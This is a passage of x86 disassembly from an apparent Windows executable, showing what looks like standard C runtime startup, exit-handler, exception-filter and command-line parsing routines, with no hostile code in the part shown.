  424574:	call   0x424406
  424579:	pop    ecx
  42457a:	call   0x424b58
  42457f:	test   eax,eax
  424581:	jge    0x42458b
  424583:	push   0x9
  424585:	call   0x424406
  42458a:	pop    ecx
  42458b:	call   0x424663
  424590:	mov    DWORD PTR [ebp-0x20],eax
  424593:	cmp    eax,esi
  424595:	je     0x42459e
  424597:	push   eax
  424598:	call   0x424406
  42459d:	pop    ecx
  42459e:	mov    DWORD PTR [ebp-0x38],esi
  4245a1:	lea    eax,[ebp-0x64]
  4245a4:	push   eax
  4245a5:	call   DWORD PTR ds:0x42904c
  4245ab:	call   0x424aef
  4245b0:	mov    DWORD PTR [ebp-0x68],eax
  4245b3:	test   BYTE PTR [ebp-0x38],0x1
  4245b7:	je     0x4245bf
  4245b9:	movzx  eax,WORD PTR [ebp-0x34]
  4245bd:	jmp    0x4245c2
  4245bf:	push   0xa
  4245c1:	pop    eax
  4245c2:	push   eax
  4245c3:	push   DWORD PTR [ebp-0x68]
  4245c6:	push   esi
  4245c7:	push   esi
  4245c8:	call   edi
  4245ca:	push   eax
  4245cb:	call   0x422f80
  4245d0:	mov    edi,eax
  4245d2:	mov    DWORD PTR [ebp-0x6c],edi
  4245d5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245d8:	jne    0x4245e0
  4245da:	push   edi
  4245db:	call   0x42479b
  4245e0:	call   0x4247bd
  4245e5:	jmp    0x424612
  4245e7:	mov    eax,DWORD PTR [ebp-0x14]
  4245ea:	mov    ecx,DWORD PTR [eax]
  4245ec:	mov    ecx,DWORD PTR [ecx]
  4245ee:	mov    DWORD PTR [ebp-0x70],ecx
  4245f1:	push   eax
  4245f2:	push   ecx
  4245f3:	call   0x42498b
  4245f8:	pop    ecx
  4245f9:	pop    ecx
  4245fa:	ret    
  4245fb:	mov    esp,DWORD PTR [ebp-0x18]
  4245fe:	mov    edi,DWORD PTR [ebp-0x70]
  424601:	cmp    DWORD PTR [ebp-0x1c],0x0
  424605:	jne    0x42460d
  424607:	push   edi
  424608:	call   0x4247ac
  42460d:	call   0x4247cc
  424612:	or     DWORD PTR [ebp-0x4],0xffffffff
  424616:	mov    eax,edi
  424618:	lea    esp,[ebp-0x7c]
  42461b:	call   0x42537b
  424620:	ret    
  424621:	push   0x42923c
  424626:	call   DWORD PTR ds:0x429024
  42462c:	test   eax,eax
  42462e:	je     0x424646
  424630:	push   0x42922c
  424635:	push   eax
  424636:	call   DWORD PTR ds:0x429020
  42463c:	test   eax,eax
  42463e:	je     0x424646
  424640:	push   DWORD PTR [esp+0x4]
  424644:	call   eax
  424646:	push   DWORD PTR [esp+0x4]
  42464a:	call   DWORD PTR ds:0x429058
  424650:	int3   
  424651:	push   0x8
  424653:	call   0x4254ff
  424658:	pop    ecx
  424659:	ret    
  42465a:	push   0x8
  42465c:	call   0x42546b
  424661:	pop    ecx
  424662:	ret    
  424663:	mov    eax,ds:0x45e270
  424668:	test   eax,eax
  42466a:	je     0x42466e
  42466c:	call   eax
  42466e:	push   esi
  42466f:	push   edi
  424670:	mov    ecx,0x42b00c
  424675:	mov    edi,0x42b018
  42467a:	xor    eax,eax
  42467c:	cmp    ecx,edi
  42467e:	mov    esi,ecx
  424680:	jae    0x424699
  424682:	test   eax,eax
  424684:	jne    0x4246c5
  424686:	mov    ecx,DWORD PTR [esi]
  424688:	test   ecx,ecx
  42468a:	je     0x42468e
  42468c:	call   ecx
  42468e:	add    esi,0x4
  424691:	cmp    esi,edi
  424693:	jb     0x424682
  424695:	test   eax,eax
  424697:	jne    0x4246c5
  424699:	push   0x425191
  42469e:	call   0x425610
  4246a3:	mov    esi,0x42b000
  4246a8:	mov    eax,esi
  4246aa:	mov    edi,0x42b008
  4246af:	cmp    eax,edi
  4246b1:	pop    ecx
  4246b2:	jae    0x4246c3
  4246b4:	mov    eax,DWORD PTR [esi]
  4246b6:	test   eax,eax
  4246b8:	je     0x4246bc
  4246ba:	call   eax
  4246bc:	add    esi,0x4
  4246bf:	cmp    esi,edi
  4246c1:	jb     0x4246b4
  4246c3:	xor    eax,eax
  4246c5:	pop    edi
  4246c6:	pop    esi
  4246c7:	ret    
  4246c8:	push   ebp
  4246c9:	mov    ebp,esp
  4246cb:	push   esi
  4246cc:	push   edi
  4246cd:	push   0x8
  4246cf:	call   0x4254ff
  4246d4:	xor    esi,esi
  4246d6:	inc    esi
  4246d7:	cmp    DWORD PTR ds:0x45db04,esi
  4246dd:	pop    ecx
  4246de:	jne    0x4246f0
  4246e0:	push   DWORD PTR [ebp+0x8]
  4246e3:	call   DWORD PTR ds:0x429060
  4246e9:	push   eax
  4246ea:	call   DWORD PTR ds:0x42905c
  4246f0:	cmp    DWORD PTR [ebp+0xc],0x0
  4246f4:	mov    al,BYTE PTR [ebp+0x10]
  4246f7:	mov    DWORD PTR ds:0x45db00,esi
  4246fd:	mov    ds:0x45dafc,al
  424702:	jne    0x424756
  424704:	mov    ecx,DWORD PTR ds:0x45e268
  42470a:	test   ecx,ecx
  42470c:	je     0x424737
  42470e:	mov    eax,ds:0x45e264
  424713:	sub    eax,0x4
  424716:	cmp    eax,ecx
  424718:	jmp    0x424730
  42471a:	mov    eax,DWORD PTR [eax]
  42471c:	test   eax,eax
  42471e:	je     0x424722
  424720:	call   eax
  424722:	mov    eax,ds:0x45e264
  424727:	sub    eax,0x4
  42472a:	cmp    eax,DWORD PTR ds:0x45e268
  424730:	mov    ds:0x45e264,eax
  424735:	jae    0x42471a
  424737:	mov    eax,0x42b01c
  42473c:	mov    esi,0x42b020
  424741:	cmp    eax,esi
  424743:	mov    edi,eax
  424745:	jae    0x424756
  424747:	mov    eax,DWORD PTR [edi]
  424749:	test   eax,eax
  42474b:	je     0x42474f
  42474d:	call   eax
  42474f:	add    edi,0x4
  424752:	cmp    edi,esi
  424754:	jb     0x424747
  424756:	mov    eax,0x42b024
  42475b:	mov    esi,0x42b028
  424760:	cmp    eax,esi
  424762:	mov    edi,eax
  424764:	jae    0x424775
  424766:	mov    eax,DWORD PTR [edi]
  424768:	test   eax,eax
  42476a:	je     0x42476e
  42476c:	call   eax
  42476e:	add    edi,0x4
  424771:	cmp    edi,esi
  424773:	jb     0x424766
  424775:	cmp    DWORD PTR [ebp+0x10],0x0
  424779:	pop    edi
  42477a:	pop    esi
  42477b:	je     0x424786
  42477d:	push   0x8
  42477f:	call   0x42546b
  424784:	jmp    0x424798
  424786:	push   DWORD PTR [ebp+0x8]
  424789:	mov    DWORD PTR ds:0x45db04,0x1
  424793:	call   0x424621
  424798:	pop    ecx
  424799:	pop    ebp
  42479a:	ret    
  42479b:	push   0x0
  42479d:	push   0x0
  42479f:	push   DWORD PTR [esp+0xc]
  4247a3:	call   0x4246c8
  4247a8:	add    esp,0xc
  4247ab:	ret    
  4247ac:	push   0x0
  4247ae:	push   0x1
  4247b0:	push   DWORD PTR [esp+0xc]
  4247b4:	call   0x4246c8
  4247b9:	add    esp,0xc
  4247bc:	ret    
  4247bd:	push   0x1
  4247bf:	push   0x0
  4247c1:	push   0x0
  4247c3:	call   0x4246c8
  4247c8:	add    esp,0xc
  4247cb:	ret    
  4247cc:	push   0x1
  4247ce:	push   0x1
  4247d0:	push   0x0
  4247d2:	call   0x4246c8
  4247d7:	add    esp,0xc
  4247da:	ret    
  4247db:	push   ebp
  4247dc:	mov    ebp,esp
  4247de:	sub    esp,0x10c
  4247e4:	mov    eax,ds:0x45d430
  4247e9:	xor    eax,DWORD PTR [ebp+0x4]
  4247ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ef:	push   ebx
  4247f0:	push   esi
  4247f1:	mov    DWORD PTR [ebp-0x4],eax
  4247f4:	xor    edx,edx
  4247f6:	push   edi
  4247f7:	xor    eax,eax
  4247f9:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424800:	je     0x424808
  424802:	inc    eax
  424803:	cmp    eax,0x12
  424806:	jb     0x4247f9
  424808:	mov    esi,eax
  42480a:	shl    esi,0x3
  42480d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424813:	jne    0x42493c
  424819:	mov    eax,ds:0x45dabc
  42481e:	cmp    eax,0x1
  424821:	je     0x424917
  424827:	cmp    eax,edx
  424829:	jne    0x424838
  42482b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424832:	je     0x424917
  424838:	cmp    ecx,0xfc
  42483e:	je     0x42493c
  424844:	push   0x104
  424849:	lea    eax,[ebp-0x10c]
  42484f:	push   eax
  424850:	push   edx
  424851:	mov    BYTE PTR [ebp-0x8],dl
  424854:	call   DWORD PTR ds:0x429068
  42485a:	test   eax,eax
  42485c:	jne    0x424871
  42485e:	lea    eax,[ebp-0x10c]
  424864:	push   0x429594
  424869:	push   eax
  42486a:	call   0x425720
  42486f:	pop    ecx
  424870:	pop    ecx
  424871:	lea    eax,[ebp-0x10c]
  424877:	push   eax
  424878:	lea    edi,[ebp-0x10c]
  42487e:	call   0x425950
  424883:	inc    eax
  424884:	cmp    eax,0x3c
  424887:	pop    ecx
  424888:	jbe    0x4248b3
  42488a:	lea    eax,[ebp-0x10c]
  424890:	push   eax
  424891:	call   0x425950
  424896:	mov    edi,eax
  424898:	lea    eax,[ebp-0x10c]
  42489e:	sub    eax,0x3b
  4248a1:	push   0x3
  4248a3:	add    edi,eax
  4248a5:	push   0x429590
  4248aa:	push   edi
  4248ab:	call   0x425820
  4248b0:	add    esp,0x10
  4248b3:	push   edi
  4248b4:	call   0x425950
  4248b9:	push   DWORD PTR [esi+0x45d1cc]
  4248bf:	mov    ebx,eax
  4248c1:	call   0x425950
  4248c6:	lea    eax,[ebx+eax*1+0x1c]
  4248ca:	pop    ecx
  4248cb:	add    eax,0x3
  4248ce:	pop    ecx
  4248cf:	and    eax,0xfffffffc
  4248d2:	call   0x425390
  4248d7:	mov    ebx,esp
  4248d9:	push   0x429574
  4248de:	push   ebx
  4248df:	call   0x425720
  4248e4:	push   edi
  4248e5:	push   ebx
  4248e6:	call   0x425730
  4248eb:	push   0x429570
  4248f0:	push   ebx
  4248f1:	call   0x425730
  4248f6:	push   DWORD PTR [esi+0x45d1cc]
  4248fc:	push   ebx
  4248fd:	call   0x425730
  424902:	push   0x12010
  424907:	push   0x429548
  42490c:	push   ebx
  42490d:	call   0x425622
  424912:	add    esp,0x2c
  424915:	jmp    0x42493c
  424917:	push   edx
  424918:	lea    eax,[ebp+0x8]
  42491b:	push   eax
  42491c:	lea    esi,[esi+0x45d1cc]
  424922:	push   DWORD PTR [esi]
  424924:	call   0x425950
  424929:	pop    ecx
  42492a:	push   eax
  42492b:	push   DWORD PTR [esi]
  42492d:	push   0xfffffff4
  42492f:	call   DWORD PTR ds:0x429064
  424935:	push   eax
  424936:	call   DWORD PTR ds:0x42900c
  42493c:	lea    esp,[ebp-0x118]
  424942:	mov    ecx,DWORD PTR [ebp-0x4]
  424945:	xor    ecx,DWORD PTR [ebp+0x4]
  424948:	call   0x425a0c
  42494d:	pop    edi
  42494e:	pop    esi
  42494f:	pop    ebx
  424950:	leave  
  424951:	ret    
  424952:	mov    eax,ds:0x45dabc
  424957:	cmp    eax,0x1
  42495a:	je     0x424969
  42495c:	test   eax,eax
  42495e:	jne    0x42498a
  424960:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424967:	jne    0x42498a
  424969:	push   0xfc
  42496e:	call   0x4247db
  424973:	mov    eax,ds:0x45db08
  424978:	test   eax,eax
  42497a:	pop    ecx
  42497b:	je     0x42497f
  42497d:	call   eax
  42497f:	push   0xff
  424984:	call   0x4247db
  424989:	pop    ecx
  42498a:	ret    
  42498b:	push   ebp
  42498c:	mov    ebp,esp
  42498e:	push   ecx
  42498f:	push   ebx
  424990:	push   esi
  424991:	push   edi
  424992:	call   0x4251f3
  424997:	mov    edi,DWORD PTR [ebp+0x8]
  42499a:	mov    esi,eax
  42499c:	mov    edx,DWORD PTR [esi+0x54]
  42499f:	mov    eax,ds:0x45d2dc
  4249a4:	mov    ecx,edx
  4249a6:	cmp    DWORD PTR [ecx],edi
  4249a8:	je     0x4249b7
  4249aa:	lea    ebx,[eax+eax*2]
  4249ad:	add    ecx,0xc
  4249b0:	lea    ebx,[edx+ebx*4]
  4249b3:	cmp    ecx,ebx
  4249b5:	jb     0x4249a6
  4249b7:	lea    eax,[eax+eax*2]
  4249ba:	lea    eax,[edx+eax*4]
  4249bd:	cmp    ecx,eax
  4249bf:	jae    0x4249c5
  4249c1:	cmp    DWORD PTR [ecx],edi
  4249c3:	je     0x4249c7
  4249c5:	xor    ecx,ecx
  4249c7:	test   ecx,ecx
  4249c9:	je     0x424ae1
  4249cf:	mov    ebx,DWORD PTR [ecx+0x8]
  4249d2:	test   ebx,ebx
  4249d4:	mov    DWORD PTR [ebp+0x8],ebx
  4249d7:	je     0x424ae1
  4249dd:	cmp    ebx,0x5
  4249e0:	jne    0x4249ee
  4249e2:	and    DWORD PTR [ecx+0x8],0x0
  4249e6:	xor    eax,eax
  4249e8:	inc    eax
  4249e9:	jmp    0x424aea
  4249ee:	cmp    ebx,0x1
  4249f1:	je     0x424adc
  4249f7:	mov    eax,DWORD PTR [esi+0x58]
  4249fa:	mov    DWORD PTR [ebp-0x4],eax
  4249fd:	mov    eax,DWORD PTR [ebp+0xc]
  424a00:	mov    DWORD PTR [esi+0x58],eax
  424a03:	mov    eax,DWORD PTR [ecx+0x4]
  424a06:	cmp    eax,0x8
  424a09:	jne    0x424ace
  424a0f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a15:	mov    eax,ds:0x45d2d4
  424a1a:	add    eax,edx
  424a1c:	cmp    edx,eax
  424a1e:	jge    0x424a47
  424a20:	lea    eax,[edx+edx*2]
  424a23:	shl    eax,0x2
  424a26:	mov    edi,DWORD PTR [esi+0x54]
  424a29:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a2e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a34:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a3a:	inc    edx
  424a3b:	add    ebx,edi
  424a3d:	add    eax,0xc
  424a40:	cmp    edx,ebx
  424a42:	jl     0x424a26
  424a44:	mov    ebx,DWORD PTR [ebp+0x8]
  424a47:	mov    ecx,DWORD PTR [ecx]
  424a49:	cmp    ecx,0xc000008e
  424a4f:	mov    edi,DWORD PTR [esi+0x5c]
  424a52:	jne    0x424a5d
  424a54:	mov    DWORD PTR [esi+0x5c],0x83
  424a5b:	jmp    0x424ac1
  424a5d:	cmp    ecx,0xc0000090
  424a63:	jne    0x424a6e
  424a65:	mov    DWORD PTR [esi+0x5c],0x81
  424a6c:	jmp    0x424ac1
  424a6e:	cmp    ecx,0xc0000091
  424a74:	jne    0x424a7f
  424a76:	mov    DWORD PTR [esi+0x5c],0x84
  424a7d:	jmp    0x424ac1
  424a7f:	cmp    ecx,0xc0000093
  424a85:	jne    0x424a90
  424a87:	mov    DWORD PTR [esi+0x5c],0x85
  424a8e:	jmp    0x424ac1
  424a90:	cmp    ecx,0xc000008d
  424a96:	jne    0x424aa1
  424a98:	mov    DWORD PTR [esi+0x5c],0x82
  424a9f:	jmp    0x424ac1
  424aa1:	cmp    ecx,0xc000008f
  424aa7:	jne    0x424ab2
  424aa9:	mov    DWORD PTR [esi+0x5c],0x86
  424ab0:	jmp    0x424ac1
  424ab2:	cmp    ecx,0xc0000092
  424ab8:	jne    0x424ac1
  424aba:	mov    DWORD PTR [esi+0x5c],0x8a
  424ac1:	push   DWORD PTR [esi+0x5c]
  424ac4:	push   0x8
  424ac6:	call   ebx
  424ac8:	pop    ecx
  424ac9:	mov    DWORD PTR [esi+0x5c],edi
  424acc:	jmp    0x424ad5
  424ace:	and    DWORD PTR [ecx+0x8],0x0
  424ad2:	push   eax
  424ad3:	call   ebx
  424ad5:	mov    eax,DWORD PTR [ebp-0x4]
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x58],eax
  424adc:	or     eax,0xffffffff
  424adf:	jmp    0x424aea
  424ae1:	push   DWORD PTR [ebp+0xc]
  424ae4:	call   DWORD PTR ds:0x42906c
  424aea:	pop    edi
  424aeb:	pop    esi
  424aec:	pop    ebx
  424aed:	leave  
  424aee:	ret    
  424aef:	cmp    DWORD PTR ds:0x45e26c,0x0
  424af6:	jne    0x424afd
  424af8:	call   0x425f2c
  424afd:	push   esi
  424afe:	mov    esi,DWORD PTR ds:0x45e274
  424b04:	test   esi,esi
  424b06:	jne    0x424b0f
  424b08:	mov    esi,0x4295ab
  424b0d:	jmp    0x424b54
  424b0f:	mov    al,BYTE PTR [esi]
  424b11:	cmp    al,0x22
  424b13:	jne    0x424b3d
  424b15:	inc    esi
  424b16:	mov    al,BYTE PTR [esi]
  424b18:	cmp    al,0x22
  424b1a:	je     0x424b4d
  424b1c:	test   al,al
  424b1e:	je     0x424b36
  424b20:	movzx  eax,al
  424b23:	push   eax
  424b24:	call   0x425a4b
  424b29:	test   eax,eax
  424b2b:	pop    ecx
  424b2c:	je     0x424b2f
  424b2e:	inc    esi
  424b2f:	inc    esi
  424b30:	mov    al,BYTE PTR [esi]
  424b32:	cmp    al,0x22
  424b34:	jne    0x424b1c
  424b36:	cmp    BYTE PTR [esi],0x22
  424b39:	jne    0x424b4e
  424b3b:	jmp    0x424b4d
  424b3d:	cmp    al,0x20
  424b3f:	jbe    0x424b4e
  424b41:	inc    esi
  424b42:	cmp    BYTE PTR [esi],0x20
  424b45:	ja     0x424b41
  424b47:	jmp    0x424b4e
  424b49:	cmp    al,0x20
  424b4b:	ja     0x424b54
  424b4d:	inc    esi
  424b4e:	mov    al,BYTE PTR [esi]
  424b50:	test   al,al
  424b52:	jne    0x424b49
  424b54:	mov    eax,esi
  424b56:	pop    esi
  424b57:	ret    
  424b58:	push   ebx
  424b59:	xor    ebx,ebx
  424b5b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b61:	push   esi
  424b62:	push   edi
  424b63:	jne    0x424b6a
  424b65:	call   0x425f2c
  424b6a:	mov    esi,DWORD PTR ds:0x45dab4
  424b70:	xor    edi,edi
  424b72:	cmp    esi,ebx
  424b74:	jne    0x424b88
  424b76:	jmp    0x424ba8
  424b78:	cmp    al,0x3d
  424b7a:	je     0x424b7d
  424b7c:	inc    edi
  424b7d:	push   esi
  424b7e:	call   0x425950
  424b83:	pop    ecx
  424b84:	lea    esi,[esi+eax*1+0x1]
  424b88:	mov    al,BYTE PTR [esi]
  424b8a:	cmp    al,bl
  424b8c:	jne    0x424b78
  424b8e:	lea    eax,[edi*4+0x4]
  424b95:	push   eax
  424b96:	call   0x426062
  424b9b:	mov    edi,eax
  424b9d:	cmp    edi,ebx
  424b9f:	pop    ecx
  424ba0:	mov    DWORD PTR ds:0x45dae4,edi
  424ba6:	jne    0x424bad
  424ba8:	or     eax,0xffffffff
  424bab:	jmp    0x424c05
  424bad:	mov    esi,DWORD PTR ds:0x45dab4
  424bb3:	push   ebp
  424bb4:	jmp    0x424be0
  424bb6:	push   esi
  424bb7:	call   0x425950
  424bbc:	mov    ebp,eax
  424bbe:	inc    ebp
  424bbf:	cmp    BYTE PTR [esi],0x3d
  424bc2:	pop    ecx
  424bc3:	je     0x424bde
  424bc5:	push   ebp
  424bc6:	call   0x426062
  424bcb:	cmp    eax,ebx
  424bcd:	pop    ecx
  424bce:	mov    DWORD PTR [edi],eax
  424bd0:	je     0x424c09
  424bd2:	push   esi
  424bd3:	push   eax
  424bd4:	call   0x425720
  424bd9:	pop    ecx
  424bda:	pop    ecx
  424bdb:	add    edi,0x4
  424bde:	add    esi,ebp
  424be0:	cmp    BYTE PTR [esi],bl
  424be2:	jne    0x424bb6
  424be4:	push   DWORD PTR ds:0x45dab4
  424bea:	call   0x425f4a
  424bef:	mov    DWORD PTR ds:0x45dab4,ebx
  424bf5:	mov    DWORD PTR [edi],ebx
  424bf7:	mov    DWORD PTR ds:0x45e260,0x1
  424c01:	xor    eax,eax
  424c03:	pop    ecx
  424c04:	pop    ebp
  424c05:	pop    edi
  424c06:	pop    esi
  424c07:	pop    ebx
  424c08:	ret    
  424c09:	push   DWORD PTR ds:0x45dae4
  424c0f:	call   0x425f4a
  424c14:	mov    DWORD PTR ds:0x45dae4,ebx
  424c1a:	or     eax,0xffffffff
  424c1d:	jmp    0x424c03
  424c1f:	push   ebp
  424c20:	mov    ebp,esp
  424c22:	push   ecx
  424c23:	push   ebx
  424c24:	mov    ebx,DWORD PTR [ebp+0xc]
  424c27:	xor    edx,edx
  424c29:	cmp    DWORD PTR [ebp+0x8],edx
  424c2c:	push   edi
  424c2d:	mov    DWORD PTR [esi],edx
  424c2f:	mov    edi,ecx
  424c31:	mov    DWORD PTR [ebx],0x1
  424c37:	je     0x424c42
  424c39:	mov    ecx,DWORD PTR [ebp+0x8]
  424c3c:	add    DWORD PTR [ebp+0x8],0x4
  424c40:	mov    DWORD PTR [ecx],edi
  424c42:	cmp    BYTE PTR [eax],0x22
  424c45:	jne    0x424c55
  424c47:	xor    ecx,ecx
  424c49:	test   edx,edx
  424c4b:	sete   cl
  424c4e:	inc    eax
  424c4f:	mov    edx,ecx
  424c51:	mov    cl,0x22
  424c53:	jmp    0x424c82
  424c55:	inc    DWORD PTR [esi]
  424c57:	test   edi,edi
  424c59:	je     0x424c60
  424c5b:	mov    cl,BYTE PTR [eax]
  424c5d:	mov    BYTE PTR [edi],cl
  424c5f:	inc    edi
  424c60:	mov    cl,BYTE PTR [eax]
  424c62:	movzx  ebx,cl
  424c65:	inc    eax
  424c66:	test   BYTE PTR [ebx+0x45df21],0x4
  424c6d:	je     0x424c7b
  424c6f:	inc    DWORD PTR [esi]
  424c71:	test   edi,edi
  424c73:	je     0x424c7a
  424c75:	mov    bl,BYTE PTR [eax]
  424c77:	mov    BYTE PTR [edi],bl
  424c79:	inc    edi
  424c7a:	inc    eax
  424c7b:	test   cl,cl
  424c7d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c80:	je     0x424cb4
  424c82:	test   edx,edx
  424c84:	jne    0x424c42
  424c86:	cmp    cl,0x20
  424c89:	je     0x424c90
  424c8b:	cmp    cl,0x9
  424c8e:	jne    0x424c42
  424c90:	test   edi,edi
  424c92:	je     0x424c98
  424c94:	and    BYTE PTR [edi-0x1],0x0
  424c98:	and    DWORD PTR [ebp-0x4],0x0
  424c9c:	cmp    BYTE PTR [eax],0x0
  424c9f:	je     0x424d7b
  424ca5:	mov    cl,BYTE PTR [eax]
  424ca7:	cmp    cl,0x20
  424caa:	je     0x424cb1
  424cac:	cmp    cl,0x9
  424caf:	jne    0x424cb7
  424cb1:	inc    eax
  424cb2:	jmp    0x424ca5
  424cb4:	dec    eax
  424cb5:	jmp    0x424c98
  424cb7:	cmp    BYTE PTR [eax],0x0
  424cba:	je     0x424d7b
  424cc0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cc4:	je     0x424ccf
  424cc6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc9:	add    DWORD PTR [ebp+0x8],0x4
  424ccd:	mov    DWORD PTR [ecx],edi
  424ccf:	inc    DWORD PTR [ebx]
  424cd1:	xor    ebx,ebx
  424cd3:	inc    ebx
  424cd4:	xor    edx,edx
  424cd6:	jmp    0x424cda
  424cd8:	inc    eax
  424cd9:	inc    edx
  424cda:	cmp    BYTE PTR [eax],0x5c
  424cdd:	je     0x424cd8
  424cdf:	cmp    BYTE PTR [eax],0x22
  424ce2:	jne    0x424d0a
  424ce4:	test   dl,0x1
  424ce7:	jne    0x424d08
  424ce9:	cmp    DWORD PTR [ebp-0x4],0x0
  424ced:	je     0x424cfb
  424cef:	lea    ecx,[eax+0x1]
  424cf2:	cmp    BYTE PTR [ecx],0x22
  424cf5:	jne    0x424cfb
  424cf7:	mov    eax,ecx
  424cf9:	jmp    0x424cfd
  424cfb:	xor    ebx,ebx
  424cfd:	xor    ecx,ecx
  424cff:	cmp    DWORD PTR [ebp-0x4],ecx
  424d02:	sete   cl
  424d05:	mov    DWORD PTR [ebp-0x4],ecx
  424d08:	shr    edx,1
  424d0a:	test   edx,edx
  424d0c:	je     0x424d1b
  424d0e:	test   edi,edi
  424d10:	je     0x424d16
  424d12:	mov    BYTE PTR [edi],0x5c
  424d15:	inc    edi
  424d16:	inc    DWORD PTR [esi]
  424d18:	dec    edx
  424d19:	jne    0x424d0e
  424d1b:	mov    cl,BYTE PTR [eax]
  424d1d:	test   cl,cl
  424d1f:	je     0x424d69
  424d21:	cmp    DWORD PTR [ebp-0x4],0x0
  424d25:	jne    0x424d31
  424d27:	cmp    cl,0x20
  424d2a:	je     0x424d69
  424d2c:	cmp    cl,0x9
  424d2f:	je     0x424d69
  424d31:	test   ebx,ebx
  424d33:	je     0x424d63
  424d35:	test   edi,edi
  424d37:	je     0x424d52
  424d39:	movzx  edx,cl
  424d3c:	test   BYTE PTR [edx+0x45df21],0x4
  424d43:	je     0x424d4b
  424d45:	mov    BYTE PTR [edi],cl
  424d47:	inc    edi
  424d48:	inc    eax
  424d49:	inc    DWORD PTR [esi]
  424d4b:	mov    cl,BYTE PTR [eax]
  424d4d:	mov    BYTE PTR [edi],cl
  424d4f:	inc    edi
  424d50:	jmp    0x424d61
  424d52:	movzx  ecx,cl
  424d55:	test   BYTE PTR [ecx+0x45df21],0x4
  424d5c:	je     0x424d61
  424d5e:	inc    eax
  424d5f:	inc    DWORD PTR [esi]
  424d61:	inc    DWORD PTR [esi]
  424d63:	inc    eax
  424d64:	jmp    0x424cd1
  424d69:	test   edi,edi
  424d6b:	je     0x424d71
  424d6d:	and    BYTE PTR [edi],0x0
  424d70:	inc    edi
  424d71:	inc    DWORD PTR [esi]
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	jmp    0x424c9c
  424d7b:	mov    eax,DWORD PTR [ebp+0x8]
  424d7e:	test   eax,eax
  424d80:	je     0x424d85
  424d82:	and    DWORD PTR [eax],0x0
  424d85:	inc    DWORD PTR [ebx]
  424d87:	pop    edi
  424d88:	pop    ebx
  424d89:	leave  
  424d8a:	ret    
  424d8b:	push   ebp
  424d8c:	mov    ebp,esp
  424d8e:	push   ecx
  424d8f:	push   ecx
  424d90:	push   ebx
  424d91:	push   esi
  424d92:	push   edi
  424d93:	xor    edi,edi
  424d95:	cmp    DWORD PTR ds:0x45e26c,edi
  424d9b:	jne    0x424da2
  424d9d:	call   0x425f2c
  424da2:	and    BYTE PTR ds:0x45dc14,0x0
  424da9:	push   0x104
  424dae:	mov    esi,0x45db10
  424db3:	push   esi
  424db4:	push   edi
  424db5:	call   DWORD PTR ds:0x429068
  424dbb:	mov    eax,ds:0x45e274
  424dc0:	cmp    eax,edi
  424dc2:	mov    DWORD PTR ds:0x45daf4,esi
  424dc8:	je     0x424dd1
  424dca:	cmp    BYTE PTR [eax],0x0
  424dcd:	mov    ebx,eax
  424dcf:	jne    0x424dd3
  424dd1:	mov    ebx,esi
  424dd3:	lea    eax,[ebp-0x4]
  424dd6:	push   eax
  424dd7:	push   edi
  424dd8:	lea    esi,[ebp-0x8]
  424ddb:	xor    ecx,ecx
  424ddd:	mov    eax,ebx
  424ddf:	call   0x424c1f
  424de4:	mov    esi,DWORD PTR [ebp-0x4]
  424de7:	mov    eax,DWORD PTR [ebp-0x8]
  424dea:	shl    esi,0x2
  424ded:	add    eax,esi
  424def:	push   eax
  424df0:	call   0x426062
  424df5:	mov    edi,eax
  424df7:	add    esp,0xc
  424dfa:	test   edi,edi
  424dfc:	jne    0x424e03
  424dfe:	or     eax,0xffffffff
  424e01:	jmp    0x424e28
  424e03:	lea    eax,[ebp-0x4]
  424e06:	push   eax
  424e07:	lea    ecx,[esi+edi*1]
  424e0a:	push   edi
  424e0b:	lea    esi,[ebp-0x8]
  424e0e:	mov    eax,ebx
  424e10:	call   0x424c1f
  424e15:	mov    eax,DWORD PTR [ebp-0x4]
  424e18:	dec    eax
  424e19:	pop    ecx
  424e1a:	mov    ds:0x45dad8,eax
  424e1f:	pop    ecx
  424e20:	mov    DWORD PTR ds:0x45dadc,edi
  424e26:	xor    eax,eax
  424e28:	pop    edi
  424e29:	pop    esi
  424e2a:	pop    ebx
  424e2b:	leave  
  424e2c:	ret    
  424e2d:	push   ecx
  424e2e:	push   ecx
  424e2f:	mov    eax,ds:0x45dc18
  424e34:	push   ebx
  424e35:	push   ebp
  424e36:	push   esi
  424e37:	push   edi
  424e38:	mov    edi,DWORD PTR ds:0x429080
  424e3e:	xor    ebx,ebx
  424e40:	xor    esi,esi
  424e42:	cmp    eax,ebx
  424e44:	push   0x2
  424e46:	pop    ebp
  424e47:	jne    0x424e76
  424e49:	call   edi
  424e4b:	mov    esi,eax
  424e4d:	cmp    esi,ebx
  424e4f:	je     0x424e5d
  424e51:	mov    DWORD PTR ds:0x45dc18,0x1
  424e5b:	jmp    0x424e7b
  424e5d:	call   DWORD PTR ds:0x429044
  424e63:	cmp    eax,0x78
  424e66:	jne    0x424e71
  424e68:	mov    eax,ebp
  424e6a:	mov    ds:0x45dc18,eax
  424e6f:	jmp    0x424e76
  424e71:	mov    eax,ds:0x45dc18
  424e76:	cmp    eax,0x1
  424e79:	jne    0x424ef8
  424e7b:	cmp    esi,ebx
  424e7d:	jne    0x424e87
  424e7f:	call   edi
  424e81:	mov    esi,eax
  424e83:	cmp    esi,ebx
  424e85:	je     0x424f00
  424e87:	cmp    WORD PTR [esi],bx
  424e8a:	mov    eax,esi
  424e8c:	je     0x424e9c
  424e8e:	add    eax,ebp
  424e90:	cmp    WORD PTR [eax],bx
  424e93:	jne    0x424e8e
  424e95:	add    eax,ebp
  424e97:	cmp    WORD PTR [eax],bx
  424e9a:	jne    0x424e8e
  424e9c:	mov    edi,DWORD PTR ds:0x42907c
  424ea2:	push   ebx
  424ea3:	push   ebx
  424ea4:	push   ebx
  424ea5:	sub    eax,esi
